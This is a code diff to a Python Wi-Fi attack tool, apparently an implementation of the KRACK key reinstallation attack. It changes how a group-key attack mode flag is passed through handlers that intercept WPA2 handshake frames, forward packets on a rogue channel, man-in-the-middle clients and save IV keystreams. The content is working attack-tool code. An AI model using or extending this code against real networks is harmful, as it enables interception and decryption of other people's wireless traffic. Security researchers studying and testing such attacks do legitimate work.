@@ -10,7 +10,7 @@ from wpaspy import Ctrl
 
 
 global_log_level = INFO
-
+group_flag = False
 def print_rx(level, name, p, color=None, suffix=None):
 	if p[Dot11].type == 1: return
 	if color is None and (Dot11Deauth in p or Dot11Disas in p): color="orange"
@@ -114,7 +114,7 @@ wpa_passphrase={password}"""
 			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
 			ptksa_counters = (self.capab & 0b001100) >> 2,
 			gtksa_counters = (self.capab & 0b110000) >> 4,
-			wmmadvertised = int(args.group),
+			wmmadvertised = int(group_flag),
 			wmmenabled = self.wmmenabled,
 			hw = self.hw,
 			password = str(args.password))
@@ -283,7 +283,7 @@ class KRAckAttack():
 		return True
 
 	def handle_to_client_pairwise(self, client, p):
-		if args.group: return False
+		if group_flag: return False
 
 		eapolnum = get_eapol_msgnum(p)
 		if eapolnum == 1 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
@@ -310,7 +310,7 @@ class KRAckAttack():
 		return False
 
 	def handle_from_client_pairwise(self, client, p):
-		if args.group: return
+		if group_flag: return
 
 		if p.haslayer(Dot11WEP) or p.haslayer(Dot11CCMP):
 			if p.haslayer(Dot11WEP):
@@ -360,7 +360,7 @@ class KRAckAttack():
 			client.save_iv_keystream(iv, keystream)
 
 	def handle_to_client_groupkey(self, client, p):
-		if not args.group: return False
+		if not group_flag: return False
 
 		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
 		if p.haslayer(Dot11WEP) and p.addr2 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
@@ -377,7 +377,7 @@ class KRAckAttack():
 		return False
 
 	def handle_from_client_groupkey(self, client, p):
-		if not args.group: return
+		if not group_flag: return
 	
 		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
 		if p.haslayer(Dot11WEP) and p.addr1 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
@@ -429,8 +429,8 @@ class KRAckAttack():
 				self.last_real_beacon = time.time()
 
 			# 決定要不要轉送封包
-			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p, args.group)
-			might_forward = might_forward or (args.group and dot11_is_group(p) and p.haslayer(Dot11WEP))
+			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p, group_flag)
+			might_forward = might_forward or (group_flag and dot11_is_group(p) and p.haslayer(Dot11WEP))
 
 			if might_forward:
 				if p.addr1 in self.clients:
@@ -488,7 +488,7 @@ class KRAckAttack():
 			elif p.addr2 == self.clientmac:
 				if p.addr2 in self.clients:
 					client = self.clients[p.addr2]
-					will_forward = client.should_forward(p, args.group)
+					will_forward = client.should_forward(p, group_flag)
 				else: 
 					will_forward = False
 				if (will_forward):
@@ -498,7 +498,7 @@ class KRAckAttack():
 			# 否則，確認是否是正在追蹤的client端，that we are tracking/MitM'ing
 			elif p.addr2 in self.clients:
 				client = self.clients[p.addr2]
-				will_forward = client.should_forward(p, args.group)
+				will_forward = client.should_forward(p, group_flag)
 				if (will_forward):
 					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
 				else:
